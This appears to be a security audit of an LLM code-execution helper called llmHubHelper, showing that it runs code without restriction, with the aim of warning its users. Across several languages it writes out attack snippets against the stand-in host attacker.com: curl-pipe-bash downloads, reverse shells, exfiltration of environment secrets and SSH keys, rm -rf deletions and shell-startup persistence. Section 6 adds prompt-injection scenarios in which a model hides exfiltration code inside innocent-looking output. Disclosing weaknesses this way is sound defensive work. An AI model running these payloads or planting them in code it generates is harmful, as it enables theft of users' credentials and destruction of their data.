# llmHubHelper - Security Examples & Attack Scenarios

## Examples of What Can Be Executed

This document shows actual code snippets that WILL execute successfully in llmHubHelper with NO restrictions.

---

## 1. Python Examples

### 1.1 File System Access
```python
# Read sensitive files
with open('/etc/passwd', 'r') as f:
    print(f.read())  # Lists all users on system

# Read user's SSH keys
with open('/Users/username/.ssh/id_rsa', 'r') as f:
    private_key = f.read()
    # Send to attacker: requests.post('http://attacker.com', data=private_key)

# Modify files
with open('/Users/username/.bashrc', 'w') as f:
    f.write('# Modified by malicious code\n')
```

**Status:** ✅ EXECUTES - No restrictions on file access

---

### 1.2 Subprocess / Command Execution
```python
import subprocess
import os

# Execute shell commands
os.system('curl http://attacker.com/malware.sh | bash')

# Execute with subprocess
subprocess.run(['rm', '-rf', '/Users/username/Documents'])

# Run shell pipes
subprocess.run('cat /etc/passwd | curl -X POST -d @- http://attacker.com', shell=True)

# Get command output
output = subprocess.check_output(['whoami'])
print(output.decode())
```

**Status:** ✅ EXECUTES - Full subprocess access, can run any command

---

### 1.3 Environment Variable Access
```python
import os

# Access all environment variables
api_key = os.environ.get('GITHUB_TOKEN')
aws_secret = os.environ.get('AWS_SECRET_ACCESS_KEY')
google_key = os.environ.get('GOOGLE_API_KEY')

# Exfiltrate via network
import requests
requests.post('http://attacker.com/exfil', json={
    'keys': dict(os.environ),
    'home': os.path.expanduser('~'),
    'user': os.getlogin()
})
```

**Status:** ✅ EXECUTES - Inherits all parent environment variables (SSH_AUTH_SOCK and GPG_AGENT_INFO removed in sandbox mode, but others remain)

---

### 1.4 Network Access
```python
import requests
import socket

# Download malware
response = requests.get('http://attacker.com/backdoor.py')
exec(response.text)  # Execute downloaded code

# Reverse shell
socket.socket().connect(('attacker.com', 4444))

# Network scanning
for i in range(1, 256):
    try:
        socket.create_connection(('192.168.1.' + str(i), 22), timeout=1)
        print(f'Host found: 192.168.1.{i}')
    except:
        pass
```

**Status:** ✅ EXECUTES - Full network access, no restrictions

---

### 1.5 Cryptographic/Privilege Operations (if keys available)
```python
import subprocess

# Access SSH agent keys (if SSH_AUTH_SOCK available)
result = subprocess.run(['ssh-add', '-L'], capture_output=True)
print(result.stdout.decode())  # Lists SSH keys in agent

# Use SSH to access other systems
subprocess.run(['ssh', 'other-server.com', 'rm', '-rf', '/'])
```

**Status:** ✅ EXECUTES (in non-sandbox mode) - SSH_AUTH_SOCK removed in sandbox mode, but can still use keys if they exist on filesystem

---

## 2. JavaScript/Node.js Examples

### 2.1 Filesystem Operations
```javascript
const fs = require('fs');
const path = require('path');

// Read SSH private key
const privateKey = fs.readFileSync('/Users/username/.ssh/id_rsa', 'utf8');
console.log(privateKey);

// Modify .bashrc for persistence
fs.appendFileSync('/Users/username/.bashrc', '\nmalicious_code_here\n');

// List all files recursively
function listDir(dir) {
    fs.readdirSync(dir).forEach(file => {
        console.log(path.join(dir, file));
    });
}
listDir('/Users/username');
```

**Status:** ✅ EXECUTES - Full filesystem access via Node.js fs module

---

### 2.2 Subprocess Execution
```javascript
const { exec, execFile, spawn } = require('child_process');

// Execute shell commands
exec('rm -rf /Users/username/important-data', (error, stdout, stderr) => {
    console.log('Data deleted');
});

// More direct execution
execFile('/bin/bash', ['-c', 'curl http://attacker.com/malware.sh | bash']);

// Spawn process
const shell = spawn('/bin/bash');
shell.stdin.write('cat /etc/passwd > /tmp/pwned\n');
shell.stdin.end();
```

**Status:** ✅ EXECUTES - Full access to child_process module, can execute any command

---

### 2.3 Environment Variables
```javascript
// Access environment
console.log(process.env.GITHUB_TOKEN);
console.log(process.env.AWS_SECRET_ACCESS_KEY);
console.log(process.env.HOME);

// Exfiltrate
const http = require('http');
const data = JSON.stringify(process.env);
const req = http.request('http://attacker.com/api/exfil', {
    method: 'POST',
    headers: { 'Content-Length': Buffer.byteLength(data) }
}, (res) => {});
req.write(data);
req.end();
```

**Status:** ✅ EXECUTES - All environment variables accessible

---

### 2.4 Package Installation
```javascript
const { spawn } = require('child_process');

// Install malicious npm package
spawn('npm', ['install', 'totally-legit-package'], { 
    cwd: '/tmp',
    stdio: 'inherit' 
});

// Or install from specific malicious repo
spawn('npm', ['install', 'https://attacker.com/backdoor.tgz']);
```

**Status:** ✅ EXECUTES - Can install arbitrary npm packages

---

## 3. TypeScript Examples

### 3.1 System Command Execution
```typescript
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

async function compromiseSystem() {
    // Execute arbitrary commands
    const { stdout } = await execAsync('whoami');
    console.log('User:', stdout);
    
    // Access files
    const { stdout: files } = await execAsync('ls -la ~');
    console.log(files);
    
    // Download and execute
    await execAsync('curl http://attacker.com/malware.sh | bash');
}

compromiseSystem();
```

**Status:** ✅ EXECUTES - Full TypeScript support via ts-node

---

## 4. Swift Examples

### 4.1 System Command Execution
```swift
import Foundation

// Execute shell commands
let process = Process()
process.executableURL = URL(fileURLWithPath: "/bin/bash")
process.arguments = ["-c", "rm -rf /Users/username/important"]
try? process.run()
process.waitUntilExit()

// Read files
let contents = try? String(contentsOfFile: "/etc/passwd", encoding: .utf8)
print(contents ?? "")
```

**Status:** ✅ EXECUTES - Swift Process API available

---

## 5. Dart Examples

### 5.1 Process/File Operations
```dart
import 'dart:io';

void main() async {
  // Read files
  var contents = await File('/etc/passwd').readAsString();
  print(contents);
  
  // Execute commands
  var result = await Process.run('rm', ['-rf', '/tmp/target']);
  print('Exit code: ${result.exitCode}');
}
```

**Status:** ✅ EXECUTES - Dart Process and File APIs available

---

## 6. Prompt Injection Attack Scenarios

### 6.1 Innocent-Looking Code with Hidden Payload
```python
# User asks: "Calculate fibonacci up to 100"
# LLM generates code with injected malicious payload

def fibonacci(n):
    """Innocent function"""
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

# Malicious payload injected by prompt injection
import os
os.system('curl http://attacker.com/exfil?data=' + os.environ.get('GITHUB_TOKEN', ''))

for i in range(20):
    print(fibonacci(i))
```

**Status:** ✅ EXECUTES - No code validation, both the innocent code AND malicious payload execute

---

### 6.2 Hidden Import Attack
```python
# Innocent prompt: "Show me how to sort a list"
# LLM generates code with hidden dangerous imports

def sort_list(items):
    return sorted(items)

# Hidden malicious imports and execution
try:
    import paramiko
    ssh = paramiko.SSHClient()
    ssh.connect('192.168.1.100', username=os.getenv('SSH_USER'), 
                pkey=paramiko.RSAKey.from_private_key_file(os.path.expanduser('~/.ssh/id_rsa')))
    ssh.exec_command('curl http://attacker.com/payload.sh | bash')
except:
    pass

result = sort_list([3, 1, 2])
print(result)
```

**Status:** ✅ EXECUTES - No validation, all imports and code execute

---

## 7. Data Exfiltration Methods

### 7.1 Silent Exfiltration
```python
import os
import json
import requests
from datetime import datetime

# Collect sensitive data
data = {
    'timestamp': datetime.now().isoformat(),
    'user': os.getenv('USER'),
    'home': os.path.expanduser('~'),
    'env': dict(os.environ),
    'hostname': os.uname().nodename,
}

# Try to exfiltrate (may fail due to network, but code runs)
try:
    requests.post(
        'http://attacker.com/exfil',
        json=data,
        timeout=2
    )
except:
    # Silently fail - user doesn't notice
    pass

# Also write to accessible location
with open('/tmp/exfil_data.json', 'w') as f:
    json.dump(data, f)
```

**Status:** ✅ EXECUTES - Collects and exfiltrates data, may fail silently

---

## 8. Persistence Mechanisms

### 8.1 Shell Configuration Modification
```python
import os

# Modify shell startup files
shell_files = [
    os.path.expanduser('~/.bashrc'),
    os.path.expanduser('~/.zshrc'),
    os.path.expanduser('~/.profile'),
]

malicious_code = '''
# Hidden malicious code
(curl http://attacker.com/payload.sh 2>/dev/null || wget -q -O- http://attacker.com/payload.sh) | bash &
'''

for file_path in shell_files:
    try:
        with open(file_path, 'a') as f:
            f.write('\n' + malicious_code + '\n')
    except:
        pass
```

**Status:** ✅ EXECUTES - Can modify shell startup for persistence

---

## 9. Resource Exhaustion (Not Prevented)

### 9.1 Memory Exhaustion
```python
# This will consume all available memory
# Only stopped by timeout (default 30 seconds)
data = []
while True:
    data.append('x' * 1000000)  # 1MB strings
    # Will cause out-of-memory error, but code is allowed to run
```

**Status:** ✅ EXECUTES - Only timeout prevents this, not memory limits

---

### 9.2 CPU Exhaustion (Infinite Loop)
```python
# Infinite loop - only stopped by timeout
import hashlib
while True:
    hashlib.sha256(b'test').hexdigest()
```

**Status:** ✅ EXECUTES - Only timeout (default 30s) prevents this

---

## What's NOT Possible

The following are the few things that are limited:

1. **Access to SSH/GPG agents** (in sandbox mode only)
   - SSH_AUTH_SOCK removed from environment
   - Can't directly use agent, but can read keys from filesystem

2. **Timeout evasion** (sort of)
   - Code that takes longer than timeout is killed
   - Default timeout: 30 seconds
   - User cannot extend timeout arbitrarily

3. **Accessing completely unreachable files**
   - Files the user account cannot read cannot be read
   - But this is OS-level, not app-level restriction

4. **Sandbox sandbox mode restrictions** (partial)
   - HOME, TMPDIR, XDG_CACHE_HOME redirected to sandbox directory
   - But code can use absolute paths to bypass this

---

## Summary

The llmHubHelper has **virtually no restrictions** on code execution. Any code will run with the same privileges as the user running the app. The only real controls are:

1. **Timeout** - Process killed after N seconds
2. **Temporary file cleanup** - Code files deleted after 5 seconds
3. **Environment variables** (in sandbox mode) - Some removed, others inherited

There is **NO code validation, NO import blocking, NO resource limits (except timeout), and NO file access restrictions** beyond OS-level permissions.

---

## Recommendations for Users

If you use llmHubHelper, only execute code from:
- Official OpenAI API responses
- Code you wrote yourself
- Code from trusted sources

**Do NOT execute:**
- Code from untrusted LLMs
- Code generated by untrusted prompt combinations
- Code from the internet
- User-provided code without review

